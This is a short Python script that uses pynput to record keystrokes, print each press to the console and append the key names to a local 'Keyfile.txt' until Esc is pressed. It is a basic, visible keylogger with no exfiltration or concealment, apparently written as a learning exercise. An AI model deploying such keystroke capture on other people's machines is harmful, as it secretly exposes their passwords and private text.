from pynput import keyboard

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    try:
        key_name = get_key_name(key)
        print(f"Key {key_name} pressed")
        
        with open("Keyfile.txt", 'a') as logkey:
            if key_name is not None:
                logkey.write(f"{key_name} ")
            else:
                logkey.write("Unknown ")
    except AttributeError:
        print("Error getting key name")

def on_release(key):
    key_name = get_key_name(key)
    print(f"Key {key_name} released")
    
    if key == keyboard.Key.esc:  # Corrected exit condition
        print("Exiting...")
        return False

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
